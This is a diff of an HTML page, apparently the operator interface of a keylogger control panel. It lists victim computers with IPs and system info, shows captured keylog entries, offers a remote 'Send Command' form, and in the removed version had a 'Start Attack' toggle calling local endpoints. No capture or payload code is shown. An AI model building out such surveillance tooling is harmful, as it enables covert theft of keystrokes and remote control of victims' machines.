@@ -1,74 +1,146 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<title>Key Logger Client</title>
-<style>
-body { font-family: sans-serif; }
-#log {
-  width: 80%;
-  height: 200px;
-  border: 1px solid #ccc;
-  overflow-y: scroll;
-  margin-top: 20px;
-  padding: 5px;
-}
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Keylogger Control Center</title>
+  <link rel="stylesheet" type="text/css" href="style.css" />
+
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
 </head>
 <body>
 
-<h1>Key Logger Control</h1>
+  <aside class="sidebar">
+    <div class="logo">Keylogger attack</div>
+    <nav class="nav">
+      <ul>
+        <li><a href="#" data-section="dashboard" class="active">Dashboard</a></li>
+        <li><a href="#" data-section="computers">Computers</a></li>
+        <li><a href="#" data-section="keylog">Keylog Data</a></li>
+        <li><a href="#" data-section="settings">Settings</a></li>
+      </ul>
+    </nav>
+  </aside>
 
-<button id="toggle">Start Attack</button>
+  <div class="main-content">
+    <header class="topbar">
+      <h1>Keylogger Control Center</h1>
+      <div class="search-container">
+        <input type="text" id="search-input" placeholder="Search computers..." />
+      </div>
+    </header>
 
-<h2>Log:</h2>
-<div id="log"></div>
+    <section id="dashboard-section" class="section active">
+      <h2>Dashboard Overview</h2>
+      <div class="cards-container">
+        <div class="card">
+          <h3>Total Computers</h3>
+          <p id="total-computers">0</p>
+        </div>
+        <div class="card">
+          <h3>Active Keyloggers</h3>
+          <p id="active-keyloggers">0</p>
+        </div>
+        <div class="card">
+          <h3>Last Command Sent</h3>
+          <p id="last-command">N/A</p>
+        </div>
+      </div>
+      <div class="cards-container">
+        <div class="card">
+          <button id="start-logging">start</button>
 
-<script>
-  const toggleButton = document.getElementById('toggle');
-  const logDiv = document.getElementById('log');
-  let attackRunning = false;
+        </div>
+        <div class="card">
+          <button id="stop-logging">stop</button>
+        </div>
+      </div>
 
-  toggleButton.addEventListener('click', () => {
-    attackRunning = !attackRunning;
-    toggleButton.textContent = attackRunning ? 'Stop Attack' : 'Start Attack';
+      <div class="chart-container">
+        <canvas id="activityChart"></canvas>
+      </div>
+    </section>
 
-    // Here you would make an AJAX request to your server
-    // to start or stop the attack.  This is placeholder data.
-    const message = attackRunning ? "Starting attack..." : "Stopping attack...";
-    logDiv.innerHTML += message + "<br>"; // Display message in log
+    <section id="computers-section" class="section">
+      <h2>Computers List</h2>
 
-    // Example using fetch (replace with your actual server endpoint)
-    fetch('/toggle_attack', { method: 'POST', body: JSON.stringify({ running: attackRunning }) })
-      .then(response => response.json())
-      .then(data => {
-        if (data.success) {
-          // Update log with server response (if needed)
-          logDiv.innerHTML += data.message + "<br>";
-        } else {
-          logDiv.innerHTML += "Error: " + data.message + "<br>";
-        }
-      });
-  });
+      <button id="add-computer-btn">Add Computer</button>
+      <ul id="computers-container" class="computers-list"></ul>
 
+      <div id="computer-details" class="details hidden">
+        <button id="close-details">×</button>
+        <h3>Computer Details</h3>
+        <p><strong>Name:</strong> <span id="detail-name"></span></p>
+        <p><strong>ID:</strong> <span id="detail-id"></span></p>
+        <p><strong>IP:</strong> <span id="detail-ip"></span></p>
+        <h4>System Info</h4>
+        <pre id="system-info"></pre>
+        <h4>Keylog Data</h4>
+        <pre id="keylog-data"></pre>
 
-  // Function to fetch and display the log (runs on page load and periodically)
-  function fetchLog() {
-    fetch('/get_log') // Replace with your actual server endpoint
-      .then(response => response.json())
-      .then(data => {
-        if (data.success) {
-          logDiv.innerHTML = data.log; // Replace with the actual log content
-        } else {
-          logDiv.innerHTML = "Error fetching log: " + data.message;
-        }
-      });
-  }
+        <button id="control-computer-btn">Send Command</button>
+      </div>
+    </section>
 
-  fetchLog(); // Fetch log on page load
-  setInterval(fetchLog, 5000); // Fetch log every 5 seconds (adjust as needed)
+      <section id="keylog-section" class="section">
+        <h2>Global Keylog Overview</h2>
 
+        <table id="keylog-table">
+          <thead>
+          <tr>
+            <th>Time</th>
+            <th>Computer Name</th>
+            <th>Log Entry</th>
+          </tr>
+          </thead>
+          <tbody id="keylog-table-body">
+          </tbody>
+        </table>
+      </section>
 
-</script>
+    </section>
 
+    <section id="settings-section" class="section">
+      <h2>Settings</h2>
+      <div class="settings-container">
+        <label for="api-url">API URL:</label>
+        <input type="text" id="api-url" placeholder="http://127.0.0.1:5000/api" />
+
+        <label for="auth-token">Auth Token:</label>
+        <input type="text" id="auth-token" placeholder="Optional security token" />
+
+        <button id="save-settings-btn">Save Settings</button>
+      </div>
+    </section>
+  </div>
+
+  <div id="control-computer-modal" class="modal-overlay hidden">
+    <div class="modal">
+      <h2>Send Command</h2>
+      <form id="send-command-form">
+        <input type="text" id="command-input" placeholder="Enter command" />
+        <button type="submit">Send</button>
+        <button type="button" class="modal-close">Cancel</button>
+      </form>
+    </div>
+  </div>
+
+  <div id="add-computer-modal" class="modal-overlay hidden">
+    <div class="modal">
+      <h2>Add New Computer</h2>
+      <form id="add-computer-form">
+        <label for="new-computer-name">Name:</label>
+        <input type="text" id="new-computer-name" placeholder="Computer Name" required>
+
+        <label for="new-computer-ip">IP:</label>
+        <input type="text" id="new-computer-ip" placeholder="192.168.1.10" required>
+
+        <button type="submit">Add</button>
+        <button type="button" class="modal-close">Cancel</button>
+      </form>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
 </body>
 </html>
